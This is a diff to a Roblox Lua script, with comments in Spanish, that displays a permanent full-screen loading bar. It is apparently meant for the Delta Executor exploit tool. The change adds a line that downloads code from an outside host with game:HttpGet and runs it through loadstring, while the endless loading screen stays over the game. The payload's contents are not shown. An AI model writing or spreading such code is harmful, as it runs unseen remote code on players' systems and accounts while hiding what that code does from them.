@@ -1,4 +1,4 @@
--- Script de Pantalla de Carga Infinita para Roblox
+-- Script de Pantalla de Carga Infinita para Roblox con Ejecución de Script Externo
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -67,9 +67,15 @@ local goal = {Size = UDim2.new(1, 0, 1, 0)} -- El objetivo es que la barra ocupe
 local tween = tweenService:Create(loadingBar, tweenInfo, goal)
 tween:Play()
 
--- Mantener la pantalla de carga visible indefinidamente
--- Si quisieras que desapareciera, añadirías aquí la lógica para destruir screenGui
--- Por ejemplo: task.wait(tiempo_para_cargar_real); screenGui:Destroy()
+-- Ejecutar el script externo después de que la GUI de carga esté visible.
+-- Esto asegura que la pantalla de carga se muestre mientras el script externo se carga y ejecuta.
+-- La pantalla de carga permanecerá visible indefinidamente, ya que la barra de carga es infinita.
+-- Para Delta Executor, la función game:HttpGet es generalmente compatible.
 
--- Para este caso, la pantalla de carga se mantendrá activa indefinidamente
--- hasta que el script sea detenido o el juego termine.
+-- Es crucial que el script externo no interfiera con la GUI de carga si se espera que esta permanezca.
+-- Si el script externo intenta modificar o destruir la GUI, la pantalla de carga podría desaparecer.
+
+loadstring(game:HttpGet("https://hesiz.com/api/iepONhug/raw"))()
+
+-- Mantener la pantalla de carga visible indefinidamente
+-- La lógica para destruir screenGui no se añade aquí para mantener la carga infinita.
